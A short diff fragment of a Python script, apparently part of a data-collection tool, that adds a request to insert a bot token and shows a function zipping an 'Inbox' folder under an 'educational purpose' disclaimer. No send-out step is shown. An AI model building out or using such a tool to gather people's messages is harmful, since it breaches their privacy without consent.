@@ -6,6 +6,8 @@ import time
 #THIS IS ONLY FOR EDUCATIONAL PURPOSE
 #HANG OUT !! AND ENJOY @hezron-Auxgrep
 
+#PLEASE ADD YOUR BOT TOKEN PLEASE > LINE NO: 16
+
 def private():
 
 	cmd = "zip -r inbox.zip Inbox"
